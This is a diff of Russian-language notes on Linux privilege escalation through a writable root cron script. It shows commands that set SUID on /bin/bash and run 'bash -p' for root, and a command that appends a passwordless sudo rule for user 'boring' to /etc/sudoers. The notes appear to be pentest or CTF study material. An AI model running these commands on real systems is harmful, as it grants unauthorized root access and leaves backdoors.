@@ -6,14 +6,13 @@ cat /etc/crontab
 Эксплуатация, если есть возможность редактировать скрипт, который запускается от root:
 1. Добавить SUID бит
 echo '#!/bin/bash
-chmod u+s /bin/bash' > script.sh
-
+chmod +s /bin/bash' > script.sh
 
 bash -p
 
 Объяснение: Вешаем SUID на bash (теперь любой запуск bash — с правами root). Запуск bash, но он сбрасывает SUID → обычный пользователь. Запуск bash без сброса SUID(-p privelege) → эффективный root.
 
-2.Изменить свои права в sudoersecho 
+2. Изменить свои права в sudoersecho 
 '#!/bin/bash
 echo "boring ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > .mysecretcronjob.sh
 
